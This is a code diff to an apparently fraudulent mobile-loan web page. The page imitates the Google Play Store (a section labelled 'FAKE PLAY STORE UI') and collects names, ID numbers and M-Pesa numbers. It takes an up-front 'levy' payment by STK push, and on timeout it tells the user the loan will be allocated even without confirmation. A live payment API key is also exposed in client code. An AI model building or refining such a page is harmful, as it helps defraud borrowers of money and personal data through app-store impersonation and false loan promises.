@@ -58,10 +58,12 @@
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
+    <!-- NATIVE ANDROID TOAST -->
     <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[14px] px-5 py-3 rounded-full shadow-lg text-center font-medium whitespace-nowrap">
         Message goes here
     </div>
 
+    <!-- 0. OFFLINE GATE -->
     <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
         <div class="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
             <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path></svg>
@@ -76,6 +78,7 @@
         </button>
     </div>
 
+    <!-- 1. IN-APP BROWSER WARNING -->
     <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
         <div class="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
             <svg class="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
@@ -88,6 +91,7 @@
         <button onclick="copyLink()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
     </div>
 
+    <!-- 2. FAKE PLAY STORE UI -->
     <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
         
         <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
@@ -629,7 +633,6 @@
         const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
         const PALPLUSS_API_KEY = "pp_live_fd61cd105772b221c4dbb023629b56452a55e06e08687de5";
 
-        // Changed levy to 1
         let state = { name: "", id: "", mpesa: "", loan: 1000, levy: 1, term: 30, interest: 100, total: 1100 };
         const amounts = [1000, 2000, 3000, 5000, 7500, 10000, 15000, 20000, 25000, 30000, 40000, 50000];
         let pollTimer = null;
@@ -641,7 +644,6 @@
             window.scrollTo(0,0);
         };
         
-        // Changed to return 1
         const calculateLevy = (loan) => { return 1; };
         
         const getDueDate = (days) => {
@@ -955,13 +957,11 @@
             localStorage.setItem('zc_user', JSON.stringify(state));
 
             try {
-                // DIRECT CALL TO PALPLUSS
-                const auth = btoa(`${PALPLUSS_API_KEY}:`);
-                
-                const res = await fetch("https://api.palpluss.com/v1/payments/stk", {
+                // CALLING SUPABASE EDGE FUNCTION (Required to bypass browser CORS)
+                const res = await fetch(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
                     method: 'POST',
                     headers: {
-                        'Authorization': `Basic ${auth}`,
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
@@ -985,7 +985,6 @@
                 const txnId = data.data?.transactionId || data.data?.transaction_id || data.transactionId || data.transaction_id || data.id;
                 if (!txnId) throw new Error("No transaction ID in response");
 
-                // Insert PENDING row to Supabase so the webhook can update it
                 fetch(`${SUPABASE_URL}/rest/v1/loans`, {
                     method: 'POST',
                     headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
@@ -997,7 +996,7 @@
                 startPolling(txnId);
 
             } catch (err) {
-                alert("Payment Error: " + err.message + "\n\nIf this says 'Failed to fetch', Palpluss is blocking the browser and we MUST use Supabase.");
+                alert("Payment Error: " + err.message);
                 document.getElementById('btn-pay').innerText = `Pay ${format(state.levy)} Levy Duty`;
                 document.getElementById('btn-pay').disabled = false;
             }
@@ -1012,12 +1011,12 @@
                 if (attempts > 45) {
                     clearInterval(pollTimer);
                     alert("Timeout: If you entered your PIN, your loan will be allocated shortly.");
-                    showSuccess(txnId); // Force it so the user is not stuck
+                    showSuccess(txnId);
                     return;
                 }
                 
                 try {
-                    // 1. Check Supabase first (Webhook should update this to ALLOCATED)
+                    // Check Supabase first (Webhook updates this)
                     const sbRes = await fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${txnId}`, {
                         headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` }
                     });
@@ -1040,7 +1039,7 @@
                         }
                     }
 
-                    // 2. Fallback check with Palpluss
+                    // Fallback check with Palpluss
                     const auth = btoa(`${PALPLUSS_API_KEY}:`);
                     const res = await fetch(`https://api.palpluss.com/v1/transactions/${txnId}`, {
                         headers: { 'Authorization': `Basic ${auth}` }
@@ -1076,7 +1075,6 @@
             document.getElementById('suc-due').innerText = getDueDate(state.term);
             document.getElementById('suc-mpesa').innerText = state.mpesa;
 
-            // Update existing PENDING row to ALLOCATED (just in case webhook missed it)
             fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${txnId}`, {
                 method: 'PATCH',
                 headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
